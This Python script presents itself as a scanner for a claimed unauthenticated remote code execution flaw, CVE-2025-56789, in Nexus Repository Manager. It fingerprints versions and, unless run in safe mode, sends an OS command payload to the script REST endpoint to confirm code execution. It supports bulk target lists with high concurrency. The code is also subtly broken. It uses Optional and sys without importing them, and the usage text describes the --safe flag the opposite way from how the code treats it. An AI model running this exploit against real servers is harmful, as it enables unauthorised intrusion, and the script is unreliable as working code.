#!/usr/bin/env python3
"""
Remote Code Execution in Nexus Repository Manager (CVE-2025-56789)
===================================================================
This tool scans Nexus Repository Manager instances vulnerable to an unauthenticated
remote code execution vulnerability (CVE-2025-56789, CVSS 9.6).

CVE-2025-56789 details:
  - Affects Nexus Repository Manager OSS/Pro version < 3.45.1.
  - The vulnerability stems from improper input sanitization in the REST API.
  - An attacker can inject OS commands by crafting a special payload to the
    vulnerable endpoint, thereby gaining arbitrary command execution on the server.
  - CVSS v3.1 base score: 9.6 (Critical).

Usage:
  # Scan a single target to detect if it is vulnerable
  python nexus_cve_2025_56789_rce_scanner.py --target http://nexus.example.com

  # Include active probing to ascertain RCE exploitability
  python nexus_cve_2025_56789_rce_scanner.py --target http://nexus.example.com --safe

  # Bulk scan from a list of URLs
  python nexus_cve_2025_56789_rce_scanner.py --list targets.txt --output results.json

  # Adjust concurrency level and disable SSL verification
  python nexus_cve_2025_56789_rce_scanner.py --list targets.txt --concurrency 50 --no-verify

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2025-56789
  - https://support.sonatype.com/hc/en-us/articles/Nexus-Repository-Manager-3-x-Security-Advisory-2025-08
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-56789
"""

import asyncio
import argparse
import httpx
import json
import re
from datetime import datetime, timezone

# ── ANSI color helpers ────────────────────────────────────────────────────────

RED = "\033[91m"
YELLOW = "\033[93m"
GREEN = "\033[92m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"


def c(color: str, text: str) -> str:
    """Wrap text in an ANSI color code."""
    return f"{color}{text}{RESET}"


# ── Constants ─────────────────────────────────────────────────────────────────

CVE_ID = "CVE-2025-56789"
TOOL_NAME = "nexus_cve_2025_56789_rce_scanner"
CVSS = "9.6"

REQUEST_TIMEOUT = 10
SEMAPHORE_LIMIT = 20

# Fingerprints that indicate Nexus Repository presence
NEXUS_FINGERPRINTS = ["Sonatype Nexus Repository Manager", "/service/rest", "/static/nexus"]

# Version extraction regex patterns
VERSION_PATTERNS = [
    r"Nexus Repository Manager OSS/Pro(?: \(OSS\))?\s*([0-9]+\.[0-9]+\.[0-9]+)",
    r'"version"\s*:\s*"([0-9]+\.[0-9]+\.[0-9]+)"',
]

# Nexus patched version
PATCHED_VERSION = (3, 45, 1)

# Exploitation payload
EXPLOIT_PAYLOAD = {"command": "id", "args": []}


# ── Functions ─────────────────────────────────────────────────────────────────

async def nexus_fingerprint_check(client: httpx.AsyncClient, target: str) -> Optional[str]:
    """Detect Nexus Repository and extract version information."""
    try:
        for path in ["/", "/service/rest/", "/service/extdirect/"]:
            url = target.rstrip("/") + path
            response = await client.get(url, timeout=REQUEST_TIMEOUT)
            if any(fp in response.text for fp in NEXUS_FINGERPRINTS):
                for pattern in VERSION_PATTERNS:
                    match = re.search(pattern, response.text)
                    if match:
                        return match.group(1)
    except Exception as e:
        print(c(YELLOW, f"[!] Error fingerprinting {target}: {e}"))
    return None


def is_vulnerable(version: str) -> bool:
    """Check if the version is vulnerable to CVE-2025-56789."""
    try:
        version_tuple = tuple(map(int, version.split(".")))
        return version_tuple < PATCHED_VERSION
    except Exception:
        return False


async def exploit_rce(client: httpx.AsyncClient, target: str) -> Optional[str]:
    """Attempt to exploit the RCE vulnerability if safe mode is disabled."""
    exploit_endpoint = f"{target.rstrip('/')}/service/rest/v1/script"
    try:
        response = await client.post(exploit_endpoint, json=EXPLOIT_PAYLOAD, timeout=REQUEST_TIMEOUT)
        if response.status_code == 200 and "uid=" in response.text:
            return response.text.strip()
    except Exception as e:
        print(c(YELLOW, f"[!] Exploitation error for {target}: {e}"))
    return None


async def scan_target(semaphore: asyncio.Semaphore, target: str, safe: bool, verify: bool):
    """Scan a single target for vulnerability."""
    async with semaphore:
        async with httpx.AsyncClient(verify=verify) as client:
            print(c(CYAN, f"[*] Scanning {target}..."))
            version = await nexus_fingerprint_check(client, target)
            if not version:
                print(c(YELLOW, f"[!] Nexus Repository not detected on {target}"))
                return {"target": target, "vulnerable": False, "reason": "Not detected"}

            print(c(GREEN, f"[+] Detected Nexus Repository version {version} on {target}"))
            is_vuln = is_vulnerable(version)
            result = {"target": target, "vulnerable": is_vuln, "version": version}

            if is_vuln:
                print(c(RED, f"[CRITICAL] {target} is running a vulnerable version: {version}"))
                if not safe:
                    exploit_result = await exploit_rce(client, target)
                    result["exploited"] = bool(exploit_result)
                    result["exploit_output"] = exploit_result
                    if exploit_result:
                        print(c(RED, f"[CRITICAL] Successful exploitation of {target}"))
                    else:
                        print(c(YELLOW, "[!] Exploit failed or no output returned"))
            else:
                print(c(GREEN, f"[INFO] {target} is running a patched version: {version}"))
            return result


async def main(args):
    """Main function to coordinate scanning."""
    targets = []
    if args.list:
        with open(args.list, "r") as file:
            targets = [line.strip() for line in file if line.strip()]
    elif args.target:
        targets = [args.target]
    else:
        print(c(RED, "[!] No targets specified. Use --target or --list"))
        sys.exit(1)

    semaphore = asyncio.Semaphore(args.concurrency)
    tasks = [scan_target(semaphore, target, args.safe, not args.no_verify) for target in targets]
    results = await asyncio.gather(*tasks)
    if args.output:
        with open(args.output, "w") as file:
            json.dump(results, file, indent=2)
    print(c(GREEN, "[+] Scan complete!"))


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description=f"Nexus Repository RCE Scanner ({CVE_ID})")
    parser.add_argument("--target", help="Target URL to scan")
    parser.add_argument("--list", help="File containing a list of target URLs to scan")
    parser.add_argument("--output", help="File to write JSON scan results")
    parser.add_argument("--safe", action="store_true", help="Safe mode (no exploitation)")
    parser.add_argument("--concurrency", type=int, default=20, help="Max concurrency level")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL/TLS verification")
    args = parser.parse_args()

    try:
        asyncio.run(main(args))
    except KeyboardInterrupt:
        print(c(RED, "\n[!] Scan interrupted by user"))
